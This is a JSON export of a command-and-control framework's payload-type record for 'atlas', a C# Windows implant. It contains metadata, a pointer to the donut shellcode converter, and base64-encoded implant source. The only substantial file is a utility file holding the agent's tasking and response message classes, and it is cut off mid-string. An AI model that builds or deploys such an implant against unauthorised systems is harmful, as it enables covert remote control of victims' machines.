{
  "payload_types": [
    {
      "wrapper": false,
      "command_template": "\n",
      "supported_os": "Windows (x86),Windows (x64)",
      "execute_help": "Run as a normal executable on Windows or use the donut project to turn into shellcode: https:\/\/github.com\/TheWover\/donut",
      "external": false,
      "container_running": true,
      "service": "rabbitmq",
      "author": "@Airzero24",
      "note": "This payload uses C# to target Windows hosts with the .NET framework installed. For more information and a more detailed README, check out: https:\/\/github.com\/airzero24\/Atlas",
      "supports_dynamic_loading": false,
      "deleted": false,
      "last_heartbeat": "03\/06\/2020 17:27:58",
      "ptype": "atlas",
      "file_extension": "cs",
      "wrapped_payload_type": "null",
      "icon": null,
      "files": [
        {
          "Http_3.5.cs": "77u\"
        },
        {
          "Crypto.cs": "77u\"
        },
        {
          "Utils.cs": "\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgQ2hlY2tJblJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBDaGVja0luUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgQ2hlY2tJblJlc3BvbnNlRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgQ2hlY2tJblJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIGlkID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIEdldFRhc2tpbmcNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCB0YXNraW5nX3NpemUgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIidGFza2luZ19zaXplIiI6ezF9fX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oR2V0VGFza2luZyBnZXRfdGFza2luZykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgZ2V0X3Rhc2tpbmcuSnNvbkZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfdGFza2luZy5hY3Rpb24pLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGdldF90YXNraW5nLnRhc2tpbmdfc2l6ZS5Ub1N0cmluZygpKQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgR2V0VGFza2luZ1Jlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PFRhc2s+IHRhc2tzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIEdldFRhc2tpbmdSZXNwb25zZSgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGFza3MgPSBuZXcgTGlzdDxUYXNrPigpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRUYXNraW5nUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJhY3Rpb24iIjogIiJ7MH0iIiwgIiJ0YXNrcyIiOiB7MX19fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBHZXRUYXNraW5nUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IEdldFRhc2tpbmdSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBHZXRUYXNraW5nUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAyKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBHZXRUYXNraW5nUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgdGFza3MgPSBUYXNrLlBhcnNlVGFza3MocGFyc2VMaXN0WzFdKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgUG9zdFJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PFRhc2tSZXNwb25zZT4gcmVzcG9uc2VzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIFBvc3RSZXNwb25zZSgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzcG9uc2VzID0gbmV3IExpc3Q8VGFza1Jlc3BvbnNlPigpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIicmVzcG9uc2VzIiI6W3sxfV19fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihQb3N0UmVzcG9uc2UgcG9zdF9yZXNwb25zZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcgcmVzcG9uc2VzID0gIiI7DQogICAgICAgICAgICAgICAgaW50IGNvdW50ID0gMDsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChUYXNrUmVzcG9uc2UgdGFza19yZXNwb25zZSBpbiBwb3N0X3Jlc3BvbnNlLnJlc3BvbnNlcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmICgoY291bnQgKyAxKSA9PSBwb3N0X3Jlc3BvbnNlLnJlc3BvbnNlcy5Db3VudCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzICs9IFRhc2tSZXNwb25zZS5Ub0pzb24odGFza19yZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgKz0gVGFza1Jlc3BvbnNlLlRvSnNvbih0YXNrX3Jlc3BvbnNlKSArICcsJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICArK2NvdW50Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gIntcImFjdGlvblwiOiBcIiIgKyBwb3N0X3Jlc3BvbnNlLmFjdGlvbiArICJcIiwgXCJyZXNwb25zZXNcIjogWyIgKyByZXNwb25zZXMgKyAiXX0iOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFBvc3RSZXNwb25zZVJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PFJlc3BvbnNlPiByZXNwb25zZXMgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgUG9zdFJlc3BvbnNlUmVzcG9uc2UoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJlc3BvbnNlcyA9IG5ldyBMaXN0PFJlc3BvbnNlPigpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQb3N0UmVzcG9uc2VSZXNwb25zZUZvcm1hdCA9IEAie3siImFjdGlvbiIiOiAiInswfSIiLCAiInJlc3BvbnNlcyIiOiB7MX19fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBQb3N0UmVzcG9uc2VSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gUG9zdFJlc3BvbnNlUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgUG9zdFJlc3BvbnNlUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAyKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQb3N0UmVzcG9uc2VSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgPSBSZXNwb25zZS5QYXJzZVJlc3BvbnNlcyhwYXJzZUxpc3RbMV0pDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBUYXNrIA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGNvbW1hbmQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBwYXJhbWV0ZXJzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0aW1lc3RhbXAgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUYXNrRm9ybWF0ID0gQCJ7eyIiY29tbWFuZCIiOiAiInswfSIiLCAiInBhcmFtZXRlcnMiIjogIiJ7e3sxfX19IiIsICIiaWQiIjogIiJ7Mn0iIiwgIiJ0aW1lc3RhbXAiIjogezN9fX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8UmVzcG9uc2U+IFBhcnNlUmVzcG9uc2VzKHN0cmluZyByZXNwb25zZXNfanNvbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2VzX2pzb24gPT0gIltdIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZXNfanNvbiA9IHJlc3BvbnNlc19qc29uLlJlcGxhY2UoIlsiLCBAIiIpLlJlcGxhY2UoIl0iLCBAIiIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBMaXN0PFJlc3BvbnNlPiByZXNwb25zZXMgPSBuZXcgTGlzdDxSZXNwb25zZT4oKTsNCiAgICAgICAgICAgICAgICBzdHJpbmdbXSByZXNwb25zZXNfc3BsaXQgPSByZXNwb25zZXNfanNvbi5TcGxpdChuZXdbXSB7ICJ9LCIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLlJlbW92ZUVtcHR5RW50cmllcyk7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIHJlc3BvbnNlIGluIHJlc3BvbnNlc19zcGxpdCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBuZXcgTGlzdDxzdHJpbmc+IHsgfTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLkNvbnRhaW5zKCJlcnJvciIpKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBSZXNwb25zZS5QYXJzZUVycm9yKHJlc3BvbnNlLCBSZXNwb25zZUVycm9yRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAzKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgICAgICAgICBSZXNwb25zZSBuZXdfcmVzcG9uc2UgPSBuZXcgUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcy5BZGQobmV3X3Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChyZXNwb25zZS5Db250YWlucygiZmlsZV9pZCIpKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBSZXNwb25zZS5QYXJzZUVycm9yKHJlc3BvbnNlLCBSZXNwb25zZURvd25sb2FkRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAzKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgICAgICAgICBSZXNwb25zZSBuZXdfcmVzcG9uc2UgPSBuZXcgUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gcGFyc2VMaXN0WzJdDQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzLkFkZChuZXdfcmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gUmVzcG9uc2UuUGFyc2VTdWNjZXNzKHJlc3BvbnNlICsgIn0iLCBSZXNwb25zZVN1Y2Nlc3NGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QuQWRkKCIiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UgbmV3X3Jlc3BvbnNlID0gbmV3IFJlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMuQWRkKG5ld19yZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlczsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBKb2JMaXN0DQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBpbnQgam9iX2NvdW50IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PEpvYj4gam9icyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBKb2JMaXN0KCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBqb2JzID0gbmV3IExpc3Q8Sm9iPigpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIEpvYg0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgaW50IGpvYl9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgY29tcGxldGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIGpvYl9zdGFydGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIHN1Y2Nlc3MgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBjb21tYW5kIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcGFyYW1ldGVycyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHJlc3BvbnNlIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBUaHJlYWQgdGhyZWFkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIHVwbG9hZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBkb3dubG9hZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBjaHVua2luZ19zdGFydGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgdG90YWxfY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgd3JpdGVfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgbG9uZyBmaWxlX3NpemUgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBwYXRoIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PHN0cmluZz4gY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIEpvYigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2h1bmtzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFVwbG9hZFRhc2tpbmcNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhc3NlbWJseV9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHJlbW90ZV9wYXRoIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVXBsb2FkVGFza2luZ0Zvcm1hdCA9IEAiIiJhc3NlbWJseV9pZCIiOiAiInswfSIiLCAiInJlbW90ZV9wYXRoIiI6ICIiezF9IiIiOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXCIsIEAiIik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1h